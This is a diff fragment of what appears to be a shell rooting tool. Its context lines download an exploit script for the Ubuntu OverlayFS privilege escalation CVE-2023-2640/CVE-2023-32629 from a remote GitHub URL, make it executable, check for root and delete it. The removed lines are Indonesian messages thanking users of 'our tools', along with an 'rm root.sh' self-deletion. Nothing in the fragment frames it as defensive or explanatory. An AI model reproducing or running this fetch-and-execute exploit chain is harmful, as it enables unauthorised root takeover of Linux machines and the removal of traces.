@@ -314,9 +314,3 @@ wget -q "https://raw.githubusercontent.com/g1vi/CVE-2023-2640-CVE-2023-32629/mai
 chmod 777 "exploit.sh"
 check_root
 rm "exploit.sh"
-
-
-echo "TERIMAKASI TELAH MENGGUNAKAN TOOLS KAMI"
-echo "TOOLS INI AKAN DI HAPUS DARI WEB"
-echo "AGAR TOOLS SAYA TETAP AMAN TIDAK DI CURI"
-rm "root.sh"
